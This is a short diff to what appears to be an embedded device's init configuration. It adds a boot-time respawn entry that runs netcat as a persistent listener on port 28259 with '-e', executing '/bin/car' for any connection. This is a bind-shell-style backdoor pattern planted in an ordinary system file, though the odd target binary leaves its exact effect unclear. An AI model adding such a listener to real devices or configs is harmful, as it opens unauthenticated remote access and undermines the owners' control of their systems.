@@ -6,6 +6,7 @@
 /dev/null::respawn:/sbin/hostapd /etc/hostapd.conf
 /dev/kmsg::respawn:/sbin/adbd
 /dev/null::respawn:/sbin/udhcpd -f /etc/udhcpd.conf -S
+/dev/kmsg::respawn:/bin/nc -kl -p28259 -e /bin/car
 
 ::restart:/sbin/init
 
